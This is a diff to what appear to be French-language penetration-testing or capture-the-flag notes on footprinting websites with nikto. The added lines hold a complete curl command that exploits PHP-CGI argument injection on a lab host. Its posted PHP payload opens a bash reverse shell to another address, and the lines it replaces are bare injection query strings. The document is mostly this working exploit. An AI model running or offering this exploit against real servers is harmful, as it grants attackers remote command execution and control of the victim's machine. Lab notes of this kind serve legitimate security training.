@@ -43,5 +43,11 @@ On utilise nikto pour footprinter les siteweb:
 
 /cgi-bin/php-cgi
 
-?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
-?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+```
+curl -i -X POST \
+"http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input=php://input" \
+--data-binary "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.16.33/5555 0>&1\"'); ?>"
+
+```
+
+
